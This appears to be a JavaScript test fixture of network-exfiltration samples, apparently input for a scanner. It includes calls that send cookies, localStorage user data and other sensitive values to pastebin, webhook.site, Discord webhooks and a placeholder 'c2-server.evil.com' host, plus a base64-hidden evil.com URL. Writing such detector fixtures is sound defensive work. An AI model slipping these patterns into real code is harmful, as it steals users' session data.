// Network exfiltration test cases

// Pastebin exfiltration
const dataUrl = "https://pastebin.com/raw/abc123";
fetch(dataUrl, { method: 'POST', body: sensitiveData });

// Private IP hardcoded
const serverIp = "192.168.1.100";
const internalApi = "http://10.0.1.50/api/data";

// Base64 decoding
const hiddenUrl = atob("aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA==");
const decodedPayload = Buffer.from(encryptedData, 'base64');

// WebSocket connection
const ws = new WebSocket("wss://c2-server.evil.com/data");
const localWs = new WebSocket("wss://localhost:8080/secure");

// Webhook exfiltration
const exfilUrl = "https://webhook.site/12345abc-def6-7890-abcd-ef1234567890";
fetch(exfilUrl, {
    method: 'POST',
    body: btoa(document.cookie)
});

// Discord webhook
const discordHook = "https://discord.com/api/webhooks/123456789/abcdefghijk";

// Data exfiltration pattern
const cookies = document.cookie;
const userData = localStorage.getItem('user');
axios.post('/exfil', { cookies, userData });